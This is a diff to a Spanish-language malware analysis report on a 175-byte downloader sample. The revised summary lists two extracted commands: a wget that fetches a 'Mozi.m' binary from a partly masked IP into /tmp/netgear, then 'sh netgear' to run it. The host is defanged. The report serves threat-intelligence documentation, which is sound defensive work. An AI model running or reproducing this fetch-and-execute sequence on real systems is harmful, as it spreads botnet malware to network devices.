@@ -4,7 +4,10 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 175 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `netgear` en `hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 175 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `sh netgear`
+2. `wget hxxp://123.5.191.XXX:41911/Mozi.m -O /tmp/netgear` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21.md](../../../../../malware-like/oraculo/downloader/23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21.md)
 
 
 ## 🏷️ Clasificación
